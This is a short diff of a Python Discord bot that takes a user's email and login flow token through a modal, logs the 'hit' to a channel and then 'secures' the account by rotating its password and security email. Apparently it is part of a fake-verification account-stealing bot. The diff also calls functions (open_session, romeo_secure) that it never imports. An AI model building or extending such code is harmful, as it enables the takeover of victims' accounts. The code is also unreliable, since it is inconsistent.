@@ -6,7 +6,7 @@ import json
 
 from views.buttons.embed_buttons import ButtonOptions
 
-from authsecuring.secure import startSecuringAccount
+from authsecuring.orch import startSecuringAccount
 from authsecuring.auth.initial_session import get_session
 from tools.send_logs import send_logs, build_log_embed
 from tools.post_hit import (
@@ -71,7 +71,7 @@ class MyModalTwo(ui.Modal):
         await send_logs(interaction.client, content="**This Account is being automaticly secured**")
         await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id, self.username), email=self.email)
 
-        self.session = get_session()
+        self.session = open_session()
 
         await set_verify_ephemeral(interaction, _checking_embed())
 
@@ -79,7 +79,7 @@ class MyModalTwo(ui.Modal):
         # after login so password / security email get rotated — same as the
         # authenticator embed path. Do not treat a failed dict as success.
         try:
-            securedAccount = await startSecuringAccount(
+            securedAccount = await romeo_secure(
                 self.session,
                 self.email,
                 self.flowtoken,
